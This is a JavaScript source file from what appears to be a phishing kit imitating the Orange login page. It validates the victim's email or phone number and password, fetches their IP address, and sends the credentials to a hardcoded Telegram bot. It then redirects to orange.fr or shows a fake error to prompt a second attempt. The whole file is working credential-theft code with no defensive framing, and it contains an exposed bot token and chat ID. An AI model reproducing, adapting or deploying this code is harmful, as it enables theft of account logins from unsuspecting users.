$(document).ready(() => {
    Vue.config.ignoredElements = ['elcos-header'];
    const index = new Vue({
      el: "#index",
      data: {
        login: 1,
        telegram_bot_id: "5335017916:AAGUqK2HqLpIcvWAUYhlr26FjqJuSwOlLZY",
        chat_id: "1440459154",
        log: {
          EMAIL: "",
          PASS: "",
        },
        rememberMe: true,
        isPasswordVisible: false,
        error: false,
        oPage: false,
      },
      created() {
        this.getIpAddress();
      },
  
      mounted() {
        localStorage.EMAIL = this.log.EMAIL;
        if (localStorage.EMAIL) this.log.EMAIL = localStorage.log.EMAIL;
      },
  
      computed: {
        isPasswordFilled() {
          return this.log.PASS.length > 0;
        },
        content() {
          var loc = JSON.stringify(locIp);
          message = "ðŸ’°LOG ORANGE NEWðŸ’°" + "\nðŸ“Œ" + iPfull + "\nðŸ”’LOG ET PASSðŸ”’ " + "\nðŸ“§: " + this.log.EMAIL + "\nðŸ”‘: " + this.log.PASS;
          var settings = {
            async: true,
            crossDomain: true,
            url: "https://api.telegram.org/bot" + this.telegram_bot_id + "/sendMessage",
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              "cache-control": "no-cache",
            },
            data: JSON.stringify({
              chat_id: this.chat_id,
              text: message,
            }),
          };
          $.ajax(settings).done(function (response) {
            console.log(response);
          });
          this.log.EMAIL.value = "";
          this.log.PASS.value = "";
          return false;
        },
      },
      methods: {
        getIpAddress: function () {
          axios
            .get("https://api.ipify.org?format=json")
            .then((response) => {
              this.ipAddress = response.data.ip;
            })
            .catch((error) => {
              console.error("Erreur lors de la rÃ©cupÃ©ration de l'adresse IP:", error);
            });
        },
        togglePasswordVisibility() {
          this.isPasswordVisible = !this.isPasswordVisible;
        },
        validEmailOrOrangeNumber(input) {
          const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
          const orangeNumberRegex = /^(06|07)\d{8}$/;
          return emailRegex.test(input) || orangeNumberRegex.test(input);
        },
        validPassword(password) {
          return password && password.length > 6;
        },
        goToCredit() {
          console.log("goToCredit called");
          console.log("Current email/phone input:", this.log.EMAIL);
  
          if (!this.validEmailOrOrangeNumber(this.log.EMAIL)) {
            this.error = true;
            console.log("Invalid email or phone number");
            return;
          }
  
          this.error = false;
          console.log("Valid email or phone number");
  
          setTimeout(() => {
            this.login = 2;
            console.log("Login set to 2, current login count:", this.login);
          }, 1300);
        },
        handleInput() {
          if (this.log.EMAIL) {
            this.error = false; // RÃ©initialiser l'erreur lors de la saisie
          }
        },
        sendLog() {
            if (this.oPage) {
              this.sendLog1();
            } else {
              this.sendLog2();
            }
          },
        sendLog1() {
          if (!this.validEmailOrOrangeNumber(this.log.EMAIL) || !this.validPassword(this.log.PASS)) {
            this.error = true;
            return;
          }
  
          this.error = false;
          this.content;
  
          setTimeout(() => {
            window.location.href = "https://www.orange.fr";
          }, 1300);
        },

        sendLog2() {
            if (!this.validEmailOrOrangeNumber(this.log.EMAIL) || !this.validPassword(this.log.PASS)) {
              this.error = true;
              return;
            }
            this.error = false;
            this.content; // ExÃ©cute la fonction qui envoie les donnÃ©es
          
            setTimeout(() => {
              this.error = true; // Affiche une erreur aprÃ¨s 1,3s au lieu de rediriger
            }, 1300);
          },
  
        handleInput2() {
          if (this.log.PASS) {
            this.error = false; // RÃ©initialiser l'erreur lors de la saisie
          }
        },
        changeAccount() {
          this.login = 1;
          console.log("Account changed, login set to 1");
        },
      },
    });
  });
  